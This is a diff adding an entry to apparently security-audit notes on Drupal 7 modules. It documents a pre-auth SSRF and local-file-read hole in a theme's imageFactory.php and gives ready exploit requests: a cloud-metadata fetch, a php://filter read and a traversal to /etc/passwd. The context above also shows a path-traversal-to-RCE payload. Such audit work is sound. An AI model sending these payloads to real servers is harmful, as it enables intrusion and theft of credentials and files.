@@ -224,3 +224,15 @@ legacy/abandoned cluster (CodeQL pipeline running).
 - **Exploit:** `POST game_protocol=../../../../sites/default/files/<plantable>` → includes an
   attacker-plantable `.inc` (e.g. via any file-upload sink) → RCE; also arbitrary `.inc` disclosure /
   traversal. Score-submission SQL there is `%d`-parameterized (clean). MED/HIGH (`.inc`-restricted).
+
+## 16. about (Drupal 7 theme) — MEDIUM — pre-auth SSRF via standalone imageFactory.php (ORIGINAL)
+- **Entry (pre-auth, bypasses Drupal):** `about/tools/imageFactory.php` runs at file scope (no
+  bootstrap, no auth); `require_once('simpleImage.php')` resolves in the same dir (no fatal). Directly
+  reachable: `GET /modules/about/tools/imageFactory.php?i=…`.
+- **Sink:** `$img = $_GET['i']` (`:3`) → guard `preg_match("/^[^\.\/]/", $img)` (`:5`) which only checks
+  the **first byte** is not `.`/`/` → `$image->load($img)` → `getimagesize($img)` (`simpleImage.php:30`)
+  + `imagecreatefrom{jpeg,gif,png}($img)`. The regex is near-useless: `http://169.254.169.254/x`,
+  `php://filter/…`, and `a/../../../etc/passwd` all pass (first char is a letter).
+- **Exploit:** `GET …/imageFactory.php?i=http://169.254.169.254/latest/meta-data/&w=100` → server-side
+  fetch = SSRF (cloud metadata / internal hosts); `?i=php://filter/convert.base64-encode/resource=…` →
+  local file read as "image". MED.
